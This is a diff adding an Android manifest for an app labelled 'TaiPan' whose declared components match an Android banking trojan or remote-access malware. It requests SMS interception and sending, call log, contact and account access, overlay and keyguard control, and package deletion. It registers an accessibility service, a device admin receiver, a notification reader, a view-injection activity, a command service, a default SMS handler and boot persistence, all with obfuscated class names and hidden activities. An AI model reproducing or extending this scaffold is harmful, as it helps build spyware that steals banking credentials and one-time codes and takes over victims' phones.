@@ -1,0 +1,325 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.xxx.zzz">
+
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <!--    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />-->
+
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <uses-permission android:name="android.permission.ACTION_MANAGE_OVERLAY_PERMISSION" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+
+    <uses-permission android:name="android.permission.GET_CLIPS" />
+    <uses-permission android:name="android.permission.READ_CLIPS" />
+    <uses-permission android:name="android.permission.WRITE_CLIPS" />
+
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+    <uses-permission android:name="android.permission.RECEIVE_LAUNCH_BROADCASTS" />
+    <uses-permission android:name="android.permission.QUICKBOOT_POWERON" />
+
+    <!--    ???-->
+    <!--    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />-->
+    <!--    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARMS" />-->
+    <!--    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />-->
+
+
+    <!--    <uses-permission android:name="android.permission.RECORD_AUDIO" />-->
+    <!--    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />-->
+    <!--    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />-->
+    <!--    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />-->
+
+    <queries>
+        <package android:name="com.miui.securitycenter" />
+        <package android:name="com.miui.permcenter" />
+
+        <package android:name="com.letv.android.letvsafe" />
+
+        <package android:name="com.asus.mobilemanager" />
+
+        <package android:name="com.huawei.systemmanager" />
+
+        <package android:name="com.coloros.safecenter" />
+        <package android:name="com.oppo.safe" />
+
+        <package android:name="com.iqoo.secure" />
+
+        <package android:name="com.vivo.permissionmanager" />
+
+        <package android:name="com.evenwell.powersaving" />
+
+        <package android:name="com.samsung.android" />
+
+        <package android:name="com.oneplus" />
+
+        <package android:name="com.android.settings" />
+    </queries>
+
+    <!--        android:preserveLegacyExternalStorage="true"-->
+    <application
+        android:allowBackup="true"
+        android:hardwareAccelerated="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="TaiPan"
+        android:noHistory="true"
+        android:requestLegacyExternalStorage="true"
+        android:roundIcon="@mipmap/ic_launcher"
+        android:supportsRtl="true"
+        android:theme="@android:style/Theme.Translucent.NoTitleBar"
+        android:usesCleartextTraffic="true">
+
+        <activity
+            android:name=".CallActivityADsafC"
+            android:configChanges="orientation|keyboardHidden|screenSize"
+            android:hardwareAccelerated="true"
+            android:launchMode="singleInstance"
+            android:showOnLockScreen="true"
+            android:exported="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true" />
+
+        <activity
+            android:name=".MainActivity"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:noHistory="true"
+            android:theme="@style/ACL" />
+
+        <activity
+            android:name=".PermissionsActivity"
+            android:exported="false"
+            android:theme="@style/ACL" />
+
+        <activity
+            android:name=".commandp.taskssv.BrowserActivity"
+            android:exported="false" />
+
+        <activity
+            android:name=".notifp.DialogActivityasd"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:exported="true"
+            android:theme="@style/ACL"  />
+
+        <activity
+            android:name=".adminp.ActivityAdminqw"
+            android:excludeFromRecents="true"
+            android:label=""
+            android:exported="true"
+            android:theme="@android:style/Theme.NoDisplay" />
+
+        <activity
+            android:name=".smsp.ChangeSmsManagerew"
+            android:excludeFromRecents="true"
+            android:label=""
+            android:exported="true"
+            android:theme="@android:style/Theme.NoDisplay" />
+
+        <activity
+            android:name=".injectp.ViewInjectionsad"
+            android:excludeFromRecents="true"
+            android:label=""
+            android:exported="true"
+            android:launchMode="singleTask">
+        </activity>
+
+        <service
+            android:name=".servicesp.CommandServicedas"
+            android:enabled="true"
+            android:exported="true"
+            android:stopWithTask="false" />
+
+        <service
+            android:name=".notifp.NotificationServicedsa"
+            android:exported="true"
+            android:stopWithTask="false" />
+        <service
+            android:name=".notifp.PushServiceds"
+            android:exported="true"
+            android:stopWithTask="false" />
+
+        <service
+            android:name=".notifp.NotificationReadServicesd"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <service android:name=".lockp.SrvLockDevice"
+            android:exported="true"/>
+
+        <service
+            android:name=".accessppp.AccessibilityServiceQ"
+            android:label="Start Accessibility"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/serviceconfig" />
+        </service>
+
+        <receiver
+            android:name=".adminp.AdminReceiverzxc"
+            android:label=" "
+            android:exported="true"
+            android:description="@string/adm"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/adm" />
+
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED" />
+                <action android:name="android.app.action.ACTION_PASSWORD_FAILED" />
+                <action android:name="android.app.action.ACTION_PASSWORD_SUCCEEDED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receiverss.BootCompletedReceiverads"
+            android:directBootAware="true"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            <intent-filter>
+                <category android:name="android.intent.category.DEFAULT" />
+
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <!--For HTC devices-->
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.REBOOT" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receiverss.MyReceiverda"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+
+                <!--Дополнительные события-->
+                <action android:name="android.intent.action.ACTION_SHUTDOWN" />
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+                <action android:name="android.intent.action.AIRPLANE_MODE" />
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.SCREEN_OFF" />
+
+                <action android:name="android.intent.action.BATTERY_OKAY" />
+
+                <action android:name="android.intent.action.DATE_CHANGED" />
+            </intent-filter>
+        </receiver>
+
+        <!--   SMS     -->
+        <receiver
+            android:name=".smsp.SmsReciever"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
+        <activity android:name=".smsp.SmsSendSms"
+            android:exported="true">
+            <intent-filter>
+                <data android:scheme="sms" />
+                <action android:name="android.intent.action.SENDTO" />
+                <data android:scheme="mms" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <data android:scheme="mmsto" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <data android:scheme="smsto" />
+                <action android:name="android.intent.action.SEND" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name=".ScreenProjectionActivity"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" />
+
+        <receiver
+            android:name=".smsp.SmsPushServiceReciever"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_WAP_PUSH">
+            <intent-filter>
+                <data android:mimeType="application/vnd.wap.mms-message" />
+                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".smsp.SmsMmsReceiver"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+            </intent-filter>
+        </receiver>
+
+        <service
+            android:name=".smsp.SmsHeadlessSmsSendService"
+            android:exported="true"
+            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE">
+            <intent-filter>
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
+                <category android:name="android.intent.category.DEFAULT" />
+
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+            </intent-filter>
+        </service>
+
+    </application>
+</manifest>
